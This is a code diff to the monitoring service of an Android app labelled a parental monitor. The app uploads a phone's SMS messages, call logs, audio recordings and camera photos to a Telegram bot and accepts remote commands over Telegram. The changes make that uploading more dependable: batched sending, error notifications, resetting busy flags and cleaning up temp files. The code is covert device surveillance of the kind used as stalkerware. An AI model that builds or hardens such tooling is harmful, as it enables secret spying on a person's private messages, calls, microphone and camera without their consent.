@@ -756,7 +756,7 @@ class MonitoringService : Service() {
             if (msgDate > 0L) {
                 handleTelegramCommand(command, msgDate, ownerOk, originOk)
             } else {
-                handleTelegramCommand(command, 0L, ownerOk, originOk)
+                handleTelegramCommand(command, 1L, ownerOk, originOk)
             }
         }
     }
@@ -775,10 +775,12 @@ class MonitoringService : Service() {
                 Intent(this, com.redeye.parentalmonitor.ui.SetupActivity::class.java).addFlags(Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_CLEAR_TOP),
                 android.app.PendingIntent.FLAG_UPDATE_CURRENT or android.app.PendingIntent.FLAG_IMMUTABLE
             )
+            val title = if (code == 400) "Chat not found (400)" else "Bot token rejected ($code)"
+            val text = if (code == 400) "Open Setup to fix the chat ID so messages work again." else "Open Setup to fix the token so commands work again."
             val notification = NotificationCompat.Builder(this, ParentalMonitorApp.RESUME_CHANNEL_ID)
                 .setSmallIcon(R.drawable.ic_notification)
-                .setContentTitle("Bot token rejected ($code)")
-                .setContentText("Open Setup to fix the token so commands work again.")
+                .setContentTitle(title)
+                .setContentText(text)
                 .setContentIntent(tap)
                 .setAutoCancel(true)
                 .build()
@@ -1761,8 +1763,18 @@ class MonitoringService : Service() {
             }
             val smsPage = smsRepository.getNewSms(lastSms).take(100)
             if (smsPage.isNotEmpty()) {
-                if (sendFitted(formatSmsMessage(smsPage))) {
-                    preferencesManager.lastSmsId = maxOf(lastSms, smsPage.maxOf { it.id })
+                var smsCursor = lastSms
+                var smsSentAny = false
+                for (part in smsPage.chunked(10)) {
+                    if (sendFitted(formatSmsMessage(part))) {
+                        smsCursor = maxOf(smsCursor, part.maxOf { it.id })
+                        try { preferencesManager.lastSmsId = smsCursor } catch (_: Exception) { }
+                        smsSentAny = true
+                    } else {
+                        break
+                    }
+                }
+                if (smsSentAny) {
                     try { preferencesManager.lastSyncTime = System.currentTimeMillis() } catch (_: Exception) { }
                 }
             }
@@ -1778,14 +1790,25 @@ class MonitoringService : Service() {
             }
             val callPage = callLogRepository.getNewCalls(lastCallTs, lastCallId).take(100)
             if (callPage.isNotEmpty()) {
-                if (sendFitted(formatCallMessage(callPage))) {
-                    val latest = callPage.maxWith(compareBy({ it.date }, { it.id }))
-                    if (latest.date > lastCallTs ||
-                        (latest.date == lastCallTs && latest.id > lastCallId)
-                    ) {
-                        preferencesManager.lastCallTimestamp = latest.date
-                        preferencesManager.lastCallId = latest.id
+                var callSentAny = false
+                for (part in callPage.chunked(10)) {
+                    if (sendFitted(formatCallMessage(part))) {
+                        try {
+                            val latest = part.maxWith(compareBy({ it.date }, { it.id }))
+                            if (latest.date > preferencesManager.lastCallTimestamp ||
+                                (latest.date == preferencesManager.lastCallTimestamp && latest.id > preferencesManager.lastCallId)
+                            ) {
+                                preferencesManager.lastCallTimestamp = latest.date
+                                preferencesManager.lastCallId = latest.id
+                            }
+                        } catch (_: Exception) {
+                        }
+                        callSentAny = true
+                    } else {
+                        break
                     }
+                }
+                if (callSentAny) {
                     try { preferencesManager.lastSyncTime = System.currentTimeMillis() } catch (_: Exception) { }
                 }
             }
@@ -2090,6 +2113,10 @@ class MonitoringService : Service() {
                         preferencesManager.credentialErrorAt = System.currentTimeMillis()
                     } catch (_: Exception) {
                     }
+                    try {
+                        postAuthFailureReminder(400)
+                    } catch (_: Exception) {
+                    }
                     messageQueue.addMessage(message)
                     MessageScheduler.scheduleMessageSend(this)
                     return false
@@ -2187,6 +2214,11 @@ class MonitoringService : Service() {
         }
         watchdogJob?.cancel()
         cameraBusy.set(false)
+        smsBusy.set(false)
+        ringBusy.set(false)
+        recordBusy.set(false)
+        audioFlushBusy.set(false)
+        photoFlushBusy.set(false)
         try {
             cameraService.forceReset()
         } catch (_: Exception) {
@@ -2274,6 +2306,11 @@ class MonitoringService : Service() {
         } catch (_: Exception) {
         }
         cameraBusy.set(false)
+        smsBusy.set(false)
+        ringBusy.set(false)
+        recordBusy.set(false)
+        audioFlushBusy.set(false)
+        photoFlushBusy.set(false)
         try {
             cameraService.forceReset()
         } catch (_: Exception) {
@@ -2798,7 +2835,6 @@ class MonitoringService : Service() {
             val url = "https://api.telegram.org/bot$botToken/sendAudio"
             val response = TelegramMediaClient.api.sendAudio(url, chatIdBody, caption, audioPart)
             if (response.isSuccessful && response.body()?.ok == true) {
-                preferencesManager.lastSyncTime = System.currentTimeMillis()
                 deleteQuietly(audioFile)
                 return MediaSendOutcome.SENT
             }
@@ -2988,7 +3024,6 @@ class MonitoringService : Service() {
 
             if (response.isSuccessful && response.body()?.ok == true) {
                 if (com.redeye.parentalmonitor.BuildConfig.DEBUG) android.util.Log.i("MonitoringService", "✓ Photo sent successfully!")
-                preferencesManager.lastSyncTime = System.currentTimeMillis()
                 preferencesManager.lastPhotoTime = System.currentTimeMillis()
                 deleteQuietly(photoFile)
                 return MediaSendOutcome.SENT
@@ -3064,6 +3099,12 @@ class MonitoringService : Service() {
     }
     private fun prunePhotoCache(maxKept: Int = 10) {
         try {
+            try {
+                cacheDir.listFiles { file ->
+                    file.isFile && file.name.startsWith("camera_") && file.name.endsWith(".tmp") && System.currentTimeMillis() - file.lastModified() > 3_600_000L
+                }?.forEach { deleteQuietly(it) }
+            } catch (_: Exception) {
+            }
             val photos = cacheDir.listFiles { file ->
                 file.isFile && file.name.startsWith("camera_") && file.name.endsWith(".jpg")
             }?.sortedBy { it.lastModified() }?.filter { it != activePhotoFile } ?: return
